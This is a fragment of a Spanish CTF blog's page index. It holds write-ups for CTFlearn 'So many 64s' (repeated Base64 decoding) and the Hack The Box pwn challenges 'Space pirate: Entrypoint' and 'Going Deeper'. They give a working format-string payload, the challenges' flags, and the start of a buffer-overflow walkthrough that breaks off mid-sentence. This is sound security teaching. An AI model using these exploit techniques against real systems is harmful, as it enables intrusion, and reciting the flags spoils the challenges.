khCTVdsZDRhMk5zWkhSa1IyaFhZbFpLU1ZaWE1YZFpWbGw1VTJ4V1VtRnJOV2hWYTFaM1YwWlZkMWRzWkZoV01GcElWbGQ0YjFVd01IbGhSbXhYWWxoQ1JGbFVTa3BsUm1SMVZHMXNVMkpHY0ZaWFYzaFRZekZrUjFkdVVrNVdSa3BZV1d0YVYwNVdjRlpXVkZaWFRVUkdlVmt3Vm5OWlZscFlZVVJPVjAxSFVrZGFWVnBQWXpGV2MxcEZOVk5pYTBwT1ZqSjBWMkV4V1hoVFdHaGhVMFUxYUZWdGN6RlVNVkpYVm01a1ZtSkdjREJaTUZZd1ZERktkR1ZHYkZkU2JXaDZWbXhrUm1WWFZraFBWbHBwVjBkbmVsZFVRbUZaVjA1elYyNU9ZVkpVVms5V2JUVkRUbFpaZVdSR1RsWk5WbkJKVlRKNGExVXlSbk5UYkdoVlZqTkNXRlV3V21Ga1JURldaRVpTVTJKR2IzaFdWbVEwV1ZkR1NGSlljRkpoYTNCWVZXMHhVazFHV1hsTlZtUlRUVmhDU2xaWGVFOWhWa3B5WTBaQ1YySllRa2hWZWtaUFZqRmtkVlZyTlZOU1ZuQlpWa1phWVZsVk1VZFdXR3hyVWpOU2IxbHJWbmRXYkd4eVYyMTBXR0pWY0VsWlZXaGhWbFpaZW1GRVRsZE5SMUpZVlRCa1UxSXhjRVpPVm1ScFlUQlplbFp0ZUdwbFJUVklVbGhvVm1Kc1NsVlpWRVozWTFaV2RFNVZUbGhTYlhoV1ZUSjRTMkV3TVZoa2VrcFdZbFJHU0ZZd1drdGphelZaWWtad1YxWnVRbTlYVmxaclZqSlNTRlpyWkdsU2JXaFlWRlJLYjFaV1duUmpSV1JUWWxaYVNWWkhkR0ZXTWtwR1RsaENWMDFHY0V4YVZWcGhVakZrZEZKdGRFNVNSVnBKVjFSQ1YxbFdaRWhTYWxwcFVteHdZVmxyV21GWFJsSjBaVVprV0ZJeFNrcFdSM2hyVkcxRmVHTkVWbGhXYkVwUVdXcEdXbVZHWkhKWGJHaHBWakpvYjFaWGVHRmtNVlpIWTBWa1dHSkhVbkpWYWtaaFUwWmFTRTFZVGxkTlJFWXdXVlZrUjFZeVJuSlhiV2hhVmtWd1dGa3ljM2hXTWtaSFYyMXNhR1ZzV21GV01XUXdXVmRSZUZwR1pHbFRSVFZZV1d4V1lXTldiSEpYYlVac1VteGFXRmxWWXpWV1ZURnlZMFZzWVZaV2NISldha0Y0WTFaS1dWcEdaR2xTTVVwTlZtMHhOR0V4V2xkVWJrNWhVako0V1ZWdGRIZE9WbHAwVFZoa1UwMVhlRmxXVjNSclZqSktSMWRzVGxwaE1taEVWakJhVjJNeFpIVmFSMmhUWWxaS05WWnNaREJUTWtwSFUyNUtUMVp0YUdGVVZWcGhZMnhhZEUxVmRGaFNNRnBIVkRGYWQyRldXa1pYYWtwWFlXdHZNRll5TVZkU01YQkpWVzEwVTFaR1dsVldSbFpUVW0xV2MxZHJhR3hTYlZKdlZGWmFjMDVXVlhsT1ZYUllVakJ3U0ZZeU1VZFdNREZJWVVWU1lWWXphSGxhVlZwclpGWlNjMkZHWkU1U1JscEtWbXBLTUZsWFNYaFdXR3hVWWtkNGIxVnJXbUZYUm14WVpFaGFUbEpzY0VaVk1uUnJWVEF4V0ZWcVJsWk5ha1o2VmxSR1MyTnRUa2RoUm1SVFlsVXhORmRYY0V0V01rMTRXa2hXVTJKR1NtOVVWRVpMVjFaYWRFMVVRbHBXYlZKNldXdGFZVmRIU2xaWGJHaFZWbXhhTTFZeWVGZFhSMUpGVld4b1UwMUlRa2xXYWtsNFlqRmtjMWRyV21wU2JFcFlXVmQwWVdGR2NFZFhhemxxWVhwc1dGZHJaSE5XTURGMFlVWm9WMkpZYUhKVWExcGFaVlpXV1dGR1pHbFNNVXBhVjFjeE5GTXhVWGhXV0dSaFVtczFjVlJXV21GTlJuQldWMjEwVlUxVmNEQldWelZ6VmpKS1ZWSllaRmROUm5CTVdrVmFWMk50U2toU2JHUlhZbXRLUmxadE1YZFRNVTE0VTFob1ZXSnNXbkZWYlRGVFZERmFkRTVWVGxoV2JWSldWVzB4UjFVd01YTlRiR2hhVFVaYWNsWnNaRWRPYkZwellVWndWMUpVVmtSV1JtUTBWMjFXUjFwSVRtRlNiVkpQVm0xMFdrMUdXbkZTYlRscVRWWndTVlV5ZEd0aGJFNUdWMnhrV21FeVVsUmFSM2hyVmpGa2MxUnNaR2xUUlVwS1ZrUkdWazFXVW5OWGJsWlNZV3h3V0ZSWE5WTlhSbEpXVjIxMFUwMVhVbHBYYTFwdllVVXhkV0ZIYUZkaVdHaG9Xa1JCZDJWSFNrbFRiVVpUVm01Q2VsWlhjRUpOVms1SFlraEtXR0pVYkZoVVZsWjNWMnhXVjFWcmRGZE5WV3cyV1ZWa2IxZHNXa1pYYkVKV1lXdGFVRnBHV2s5ak1rWklZVWQ0YVZkSGFHRldiWFJoWVdzeFdGTllhRmhpUjFKWldXMTBZVlV4YkhKYVJrNVhVbTE0ZWxZeU1VZFhSa3B6WWtSV1ZXSkdjRkJaVmxwTFkyMUtSVlJzWkU1aGEwVjRWbTE0WVZsV1dYaFViazVvVW14d1QxVnROVU5pTVZwWVkwVjBVMDFWTlZoV1Z6VlBWMGRHTmxadE9WVldSVXBNVlhwR1dtVkdaSE5hUm5CWFRVZDNNRll5ZEc5Vk1WcElVMnRvYkZKdFVtRlphMlJUWkd4WmQxZHRSbXBpUm5Bd1ZXMHhOR0ZXU25WUmFscFhZV3R2TUZaRVNrWmxSazV6Vm0xc1UySlhhRmxXVjNCUFlqSk9jMkpHWkZoaVZWcHhXV3hXZDFKc1dsaGxSM1JWWWtac05GVXhhSGRXTWtWNFUydDRWbUpVUmxoVmFrWnJaRlpPZEZKc1RtbFdNbWd6Vm14amQwMVdSWGhXYkdSWVltdGFVMWxzVm1GWlZscDBaVWhPVDFKc2NEQlViRnBQWVZaS2NtTkdiRmRXTTAweFZteGFZV015VGtkaFJsWnBWMGRvZVZkVVNYaFNNVTVIVTI1T1dHSkhVbkJWYlRWRFdWWmFjbFZyVGxaTmF6RTBWVEowYTJGc1NrZGpSVGxXWVRKUk1GVnNXbXRrVjBsNldrWkNWMVpVVmpGV1ZWcFNaREZPTTJKNk1Fc0sK  Mirando los caracteres que hay y el nombre del reto, podemos deducir que se trata del resultado de codificar un cierto texto en Base64 muchas veces.\nComo es posible que haya muchas codificaciones, podemos utilizar un bucle en Bash hasta que encontremos la flag en texto claro:\n$ f=$(cat flag.txt); while true; do if [[ $f = CTFlearn* ]]; then echo $f; break; fi; f=$(echo $f | base64 -d); done CTFlearn{pr3tty_b4s1c_r1ght?}  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/ctflearn/cryptography/so-many-64s/","section":"ctf","summary":"Múltiples codificaciones Base64","time":0,"title":"So many 64s"},{"contents":"Se nos proporciona un binario de 64 bits llamado sp_entrypoint:\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/'  Podemos ejecutarlo para ver lo que hay, dos opciones:\n$ ./sp_entrypoint Authentication System ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓▒░▒▓▓▓░░▓▓▓▓▓ ░ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓░░░▓▓▓▒░▓▓▓▓▓ ░ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓░░░▓▓▓░░▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒░▓▓░░░▓▓▓░░▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓▒░░▓▓▓░░▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒░▓▓░░░▓▓▓░ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓░░░▓▓▒░░▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒░░░▓▓░░░▓▓▒░ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒░░░▒▓▓░░░▓▓▒ ░▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓░░░░░▓▓░░░▓▓▓ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░▓▓▓▒░░░░▓▓▒ ▓▓▒ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓░▒░░░▓▓░ ▓▓▒ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓░▒▓▓▓░░░░░▓▓░ ▓▓▒ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▒░▓▓▓░░░░ ▓▓ ▓▓▒ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 1. Scan card 💳 2. Insert password  \u0026gt;  Si descompilamos el binario con Ghidra, veremos la función main:\nundefined8 main() { longlVar1; longin_FS_OFFSET; longlocal_48; long*local_40; charlocal_38[40]; longlocal_10;  local_10 =*(long*) (in_FS_OFFSET +0x28); setup(); banner(); local_48 =0xdeadbeef; local_40 =\u0026amp;local_48; printf(\u0026amp;DAT_001025e0); lVar1 =read_num(); if(lVar1 !=1) { if(lVar1 ==2) { check_pass(); } printf(\u0026amp;DAT_00102668, \u0026amp;DAT_0010259a); /* WARNING: Subroutine does not return */ exit(0x1b39); } printf(\"\\n[!] Scanning card.. Something is wrong!\\n\\nInsert card\\'s serial number: \"); read(0,local_38, 0x1f); printf(\"\\nYour card is: \"); printf(local_38); if(local_48 ==0xdead1337) { open_door(); } else{ printf(\u0026amp;DAT_001026a0, \u0026amp;DAT_0010259a); } if(local_10 ==*(long*) (in_FS_OFFSET +0x28)) { return0; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); }  La segunda opción solicita una contraseña:\n$ ./sp_entrypoint ... 1. Scan card 💳 2. Insert password  \u0026gt; 2 [*] Insert password: asdf [-] Invalid password! Intruder detected! 🚨 🚨  La función que se encarga de la autenticación es check_pass:\nvoidcheck_pass() { intiVar1; longin_FS_OFFSET; undefined8 local_28; undefined8 local_20; longlocal_10;  local_10 =*(long*) (in_FS_OFFSET +0x28); local_28 =0; local_20 =0; printf(\"[*] Insert password: \"); read(0, \u0026amp;local_28, 0xf); iVar1 =strncmp(\"0nlyTh30r1g1n4lCr3wM3mb3r5C4nP455\", (char*) \u0026amp;local_28, 0x21); if(iVar1 !=0) { printf(\u0026amp;DAT_001025a8, \u0026amp;DAT_0010259a); /* WARNING: Subroutine does not return */ exit(0x1b39); } open_door(); if(local_10 !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; }  Como se muestra, el programa lee 0xf (15) bytes y los compara con 0nlyTh30r1g1n4lCr3wM3mb3r5C4nP455. Sin embargo, no somos capaces de introducir más de 15 bytes, por lo que no hay manera de pasar la comparación.\nSi fuéramos capaces de pasarla, entonces el programa llamaría a la función open_door, y se mostraría la flag:\nvoidopen_door() { longlVar1; longin_FS_OFFSET;  lVar1 =*(long*) (in_FS_OFFSET +0x28); printf(\"\\n%s[+] Door opened, you can proceed with the passphrase: \", \u0026amp;DAT_00100eb8); system(\"cat flag*\"); if(lVar1 !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; }  Si vamos de nuevo al main, vemos que tenemos otra posibilidad si elegimos la primera opción:\nprintf(\"\\n[!] Scanning card.. Something is wrong!\\n\\nInsert card\\'s serial number: \"); read(0,local_38, 0x1f); printf(\"\\nYour card is: \"); printf(local_38); if(local_48 ==0xdead1337) { open_door(); } else{ printf(\u0026amp;DAT_001026a0, \u0026amp;DAT_0010259a); }  Aquí hay una vulnerabilidad de Format String, ya que printf utiliza como primer argumento la misma información que ponemos como \u0026ldquo;card\u0026rsquo;s serial number\u0026rdquo;. Una prueba de concepto:\n$ ./sp_entrypoint ... 1. Scan card 💳 2. Insert password  \u0026gt; 1 [!] Scanning card.. Something is wrong! Insert card's serial number: %x Your card is: eb7a7420 [-] Invalid password! Intruder detected! 🚨 🚨  El valor eb7a7420 es un valor tomado de la pila (stack), por lo que podemos potencialmente leer y escribir en la pila con la vulnerabilidad de Format String.\nAquí, si local_48 tiene un valor de 0xdead1337, entonces se llamaría a open_door. Desafortunadamente, local_48 está puesto como 0xdeadbeef, por lo que es diferente.\nPero podemos usar la vulnerabilidad de Format String para modificar el valor de la variable local. Vamos a encontrar el offset en la pila donde se guarda local_48:\n$ ./sp_entrypoint ... 1. Scan card 💳 2. Insert password  \u0026gt; 1 [!] Scanning card.. Something is wrong! Insert card's serial number: %lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx. Your card is: 7ffed66b4cf0.7f61975088c0.0.f.0.deadbeef.7ffed66b7390.2e786c252e786c25 [-] Invalid password! Intruder detected! 🚨 🚨  Parece que está en la posición 6. Vamos a comprobarlo con %6$lx:\n$ ./sp_entrypoint ... 1. Scan card 💳 2. Insert password  \u0026gt; 1 [!] Scanning card.. Something is wrong! Insert card's serial number: %6$lx Your card is: deadbeef [-] Invalid password! Intruder detected! 🚨 🚨  Perfecto. Ahora tenemos que usar el formato %n (por ejemplo, %6$n) para escribir datos en memoria. La manera en la que %6$n funciona es que guarda el número de caracteres impresos hasta %6$n en la dirección de la sexta posición de la pila.\nPor esta razón, no podemos usar %6$n, ya que 0xdeadbeef no es una dirección válida. Tenemos que encontrar la dirección que contiene 0xdeafbeef. Vamos a usar GDB para encontrarla:\n$ gdb -q sp_entrypoint Reading symbols from sp_entrypoint... (No debugging symbols found in sp_entrypoint) gef➤ run Starting program: ./sp_entrypoint ... 1. Scan card 💳 2. Insert password  \u0026gt; ^C Program received signal SIGINT, Interrupt. 0x00007ffff7af2031 in read () from ./glibc/libc.so.6  gef➤ grep 0xdeadbeef [+] Searching '\\xef\\xbe\\xad\\xde' in memory [+] In './sp_entrypoint'(0x555555400000-0x555555403000), permission=r-x 0x555555400d18 - 0x555555400d28 → \"\\xef\\xbe\\xad\\xde[...]\" [+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw- 0x7fffffffe650 - 0x7fffffffe660 → \"\\xef\\xbe\\xad\\xde[...]\"  Parece que local_48 está en la dirección 0x7fffffffe650. Ahora vamos a enumerar la vulnerabilidad de Format String otra vez:\ngef➤ continue Continuing. 1 [!] Scanning card.. Something is wrong! Insert card's serial number%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx. Your card is: 7fffffffbfb0.7ffff7dcf8c0.0.f.0.deadbeef.7fffffffe650.2e786c252e786c25 [-] Invalid password! Intruder detected! 🚨 🚨 [Inferior 1 (process 76812) exited normally]  Vale, necesitamos escribir en la posición 7, por lo que usaremos %7$n.\nDe hecho, podemos usar %7$hn para sobrescribir media palabra (2 bytes), porque es lo que necesitamos en esta situación. Para imprimir 0x1337 (4919) bytes, podemos usar otra format string, que es %4919c. Vamos a probar:\n1. Scan card 💳 2. Insert password  \u0026gt; 1 [!] Scanning card.. Something is wrong! Insert card's serial number: %4919c%7$hn Your card is: [+] Door opened, you can proceed with the passphrase: HTB{f4k3_fl4g_f0r_t3st1ng}  Lo tenemos. Vamos entonces a explotar la instancia remota:\n$ nc 178.62.26.185 31995 ... 1. Scan card 💳 2. Insert password  \u0026gt; 1 [!] Scanning card.. Something is wrong! Insert card's serial number: %4919c%7$hn Your card is: [+] Door opened, you can proceed with the passphrase: HTB{g4t3_0n3_d4rkn3e55_th3_w0rld_0f_p1r4t35}  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/pwn/space-pirate-entrypoint/","section":"ctf","summary":"Binario de 64 bits. Vulnerabilidad de Format String. Modificación de variables locales","time":4,"title":"Space pirate: Entrypoint"},{"contents":"Se nos proporciona un binario de 64 bits llamado sp_going_deeper:\nArch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./glibc/'  Si lo ejecutamos, tenemos tres opciones:\n$ ./sp_going_deeper Trying to leak information from the pc.. 🖥️ ____________________________________________________ / \\ | _____________________________________________ | | | | | | | goldenfang@d12:$ history | | | | 1 ls | | | | 2 mv secret_pass.txt flag.txt | | | | 3 chmod -x missile_launcher.py | | | | 4 ls | | | | 5 history | | | | | | | | | | | | | | | | | | | | | | | | | | | |_____________________________________________| | | | \\_____________________________________________________/ \\_______________________________________/ _______________________________________________ _-' .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-. --- `-_ _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--. .-.-.`-_ _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_ _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_ _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_ :-----------------------------------------------------------------------------: `---._.-----------------------------------------------------------------._.---' [*] Safety mechanisms are enabled! [*] Values are set to: a = [1], b = [2], c = [3]. [*] If you want to continue, disable the mechanism or login as admin. 1. Disable mechanisms ⚙️ 2. Login ✅ 3. Exit 🏃 \u0026gt;\u0026gt;  En este punto, vamos a abrir el binario en Ghidra para analizar el código en C descompilado. Esta es la función main:\nundefined8main() { setup(); banner(); puts(\"\\x1b[1;34m\"); admin_panel(1, 2, 3); return0; }  Y esta función llama a admin_panel usando los parámetros 1, 2 y 3:\nvoidadmin_panel(longparam_1, longparam_2, longparam_3) { intiVar1; charlocal_38[40]; longlocal_10;  local_10 =0; printf(\"[*] Safety mechanisms are enabled!\\n[*] Values are set to: a = [%x], b = [%ld], c = [%ld]. \\n[*] If you want to continue, disable the mechanismor login as admin.\\n\", param_1, param_2, param_3); while(((local_10 !=1\u0026amp;\u0026amp;(local_10 !=2)) \u0026amp;\u0026amp;(local_10 !=3))) { printf(\u0026amp;DAT_004014e8); local_10 =read_num(); } if(local_10 ==1) { printf(\"\\n[*] Input: \"); } else{ if(local_10 !=2) { puts(\"\\n[!] Exiting..\\n\"); /* WARNING: Subroutine does not return */ exit(0x1b39); } printf(\"\\n[*] Username: \"); } read(0, local_38, 0x39); if(((param_1 ==0xdeadbeef) \u0026amp;\u0026amp;(param_2 ==0x1337c0de)) \u0026amp;\u0026amp;(param_3 ==0x1337beef)) { iVar1 =strncmp(\"DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft\", local_38, 0x34);  if(iVar1 !=0) { printf(\"\\n%s[+] Welcome admin! The secret message is: \", \u0026amp;DAT_00400c38); system(\"cat flag*\"); gotoLAB_00400b38; } } printf(\"\\n%s[-] Authentication failed!\\n\", \u0026amp;DAT_00400c40); LAB_00400b38: puts(\"\\n[!] For security reasons, you are logged out..\\n\"); return; }  Lo primero que vemos es que necesitamos usar la primera o la segunda opción para llegar al punto donde se ejecuta system(\u0026quot;cat flag*\u0026quot;). Para ello, tenemos que fallar en una comparación entre strings con una contraseña hard-coded (nótese que iVar1 != 0). Además, los parámetros pasados a la función tienen que ser 0xdeadbeef, 0x1337c0de y 0x1337beef (no 1, 2, 3).\nExiste una vulnerabilidad de Buffer Overflow. Nótese que local_38 es una cadena de caracteres de 40 bytes, y el programa lee hasta 0x39 (57) bytes. Por tanto, somos capaces de sobrescribir valores de la pila (por ejemplo, la dirección de retorno).\nLa idea es sobrescribir la dirección de retorno con la dirección de system(\u0026quot;cat flag*\u0026quot;) (realmente, una o dos direcciones antes), de manera que redirigimos el flujo de ejecución del programa y leemos la flag. Vamos a tratar de romper el programa:\n$ ./sp_going_deeper ... [*] Safety mechanisms are enabled! [*] Values are set to: a = [1], b = [2], c = [3]. [*] If you want to continue, disable the mechanism or login as admin. 1. Disable mechanisms ⚙️ 2. Login ✅ 3. Exit 🏃 \u0026gt;\u0026gt; 1 [*] Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaa [-] Authentication failed! [!] For security reasons, you are logged out.. zsh: segmentation fault (core dumped) ./sp_going_deeper  El programa se rompe, lo que significa que la dirección de retorno se ha modificado y el flujo de ejecución se ha corrompido. Vamos a ver en GDB cómo podemos controlar la dirección de retorno:\n$ gdb -q sp_going_deeper Reading symbols from sp_going_deeper... (No debugging symbols found in sp_going_deeper) gef➤ disassemble admin_panel Dump of assembler code for function admin_panel: ... 0x0000000000400aba \u0026lt;+209\u0026gt;: call 0x400730 \u0026lt;read@plt\u0026gt; 0x0000000000400abf \u0026lt;+214\u0026gt;: mov eax,0xdeadbeef 0x0000000000400ac4 \u0026lt;+219\u0026gt;: cmp QWORD PTR [rbp-0x38],rax 0x0000000000400ac8 \u0026lt;+223\u0026gt;: jne 0x400b20 \u0026lt;admin_panel+311\u0026gt; 0x0000000000400aca \u0026lt;+225\u0026gt;: cmp QWORD PTR [rbp-0x40],0x1337c0de 0x0000000000400ad2 \u0026lt;+233\u0026gt;: jne 0x400b20 \u0026lt;admin_panel+311\u0026gt; 0x0000000000400ad4 \u0026lt;+235\u0026gt;: cmp QWORD PTR [rbp-0x48],0x1337beef 0x0000000000400adc \u0026lt;+243\u0026gt;: jne 0x400b20 \u0026lt;admin_panel+311\u0026gt; 0x0000000000400ade \u0026lt;+245\u0026gt;: lea rax,[rbp-0x30] 0x0000000000400ae2 \u0026lt;+249\u0026gt;: mov edx,0x34 0x0000000000400ae7 \u0026lt;+254\u0026gt;: mov rsi,rax 0x0000000000400aea \u0026lt;+257\u0026gt;: lea rdi,[rip+0xa67] # 0x401558 0x0000000000400af1 \u0026lt;+264\u0026gt;: call 0x4006e0 \u0026lt;strncmp@plt\u0026gt; 0x0000000000400af6 \u0026lt;+269\u0026gt;: test eax,eax 0x0000000000400af8 \u0026lt;+271\u0026gt;: je 0x400b20 \u0026lt;admin_panel+311\u0026gt; 0x0000000000400afa \u0026lt;+273\u0026gt;: lea rsi,[rip+0x137] # 0x400c38 0x0000000000400b01 \u0026lt;+280\u0026gt;: lea rdi,[rip+0xa88] # 0x401590 0x0000000000400b08 \u0026lt;+287\u0026gt;: mov eax,0x0 0x0000000000400b0d \u0026lt;+292\u0026gt;: call 0x400710 \u0026lt;printf@plt\u0026gt; 0x0000000000400b12 \u0026lt;+297\u0026gt;: lea rdi,[rip+0xaa5] # 0x4015be 0x0000000000400b19 \u0026lt;+304\u0026gt;: call 0x400700 \u0026lt;system@plt\u0026gt; ... End of assembler dump.  Estaré usando la dirección 0x400afa. Para poder enviar esta dirección, tiene que estar formateada como bytes (little-endian). Vamos a explotarlo localmente:\n$ gdb -q sp_going_deeper Reading symbols from sp_going_deeper... (No debugging symbols found in sp_going_deeper) gef➤ run Starting program: ./sp_going_deeper ... [*] Safety mechanisms are enabled! [*] Values are set to: a = [1], b = [2], c = [3]. [*] If you want to continue, disable the mechanism or login as admin. 1. Disable mechanisms ⚙️ 2. Login ✅ 3. Exit 🏃 \u0026gt;\u0026gt; 1 [*] Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA [-] Authentication failed! [!] For security reasons, you are logged out.. Program received signal SIGSEGV, Segmentation fault. 0x0000000000400b41 in admin_panel ()  gef➤ x $rsp 0x7fffffffe600: 0x00400ba0 gef➤ p $rip $1 = (void (*)()) 0x400b41 \u0026lt;admin_panel+344\u0026gt;  Pero no sucede lo que esperamos, no vemos el montón de A en la pila. Vamos a usar otra letra, por ejemplo la B, por si acaso:\ngef➤ x $rsp 0x7fffffffe600: 0x00400ba0 gef➤ p $rip $2 = (void (*)()) 0x400b42 \u0026lt;admin_panel+345\u0026gt;  ¿Ves la diferencia? El primer $rip se modificó a 0x400b41, y el segundo a 0x400b42. Esto significa que tenemos un solo byte de desbordamiento, pero es suficiente para redirigir el flujo de ejecución del programa. Por ejemplo, podemos hacer que $rip apunte a 0x400b01 (introduciendo \\x01). Vamos a usar Python y pwntools para 